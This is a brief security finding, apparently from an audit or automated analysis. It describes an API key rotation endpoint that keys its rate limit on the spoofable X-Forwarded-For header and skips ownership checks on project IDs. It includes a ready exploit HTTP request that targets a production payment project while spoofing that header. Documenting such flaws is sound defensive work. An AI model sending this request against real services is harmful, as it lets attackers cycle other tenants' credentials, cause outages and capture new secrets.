diagnosis: The API key rotation endpoint uses express-rate-limit keyed directly on req.headers['x-forwarded-for'] and lacks object-level ownership checks on projectId. An attacker can rotate the X-Forwarded-For header to bypass the 3-attempt limit and cycle the production API credentials of any project ID, causing denial of service to the victim project's services and capturing new secrets.
exploit_request:
POST /api/projects/proj_prod_payment_service/keys/rotate HTTP/1.1
Host: api.developer-console.io
Authorization: Bearer eyJhbGciOiJIUzI1Ni...
X-Forwarded-For: 185.220.101.5
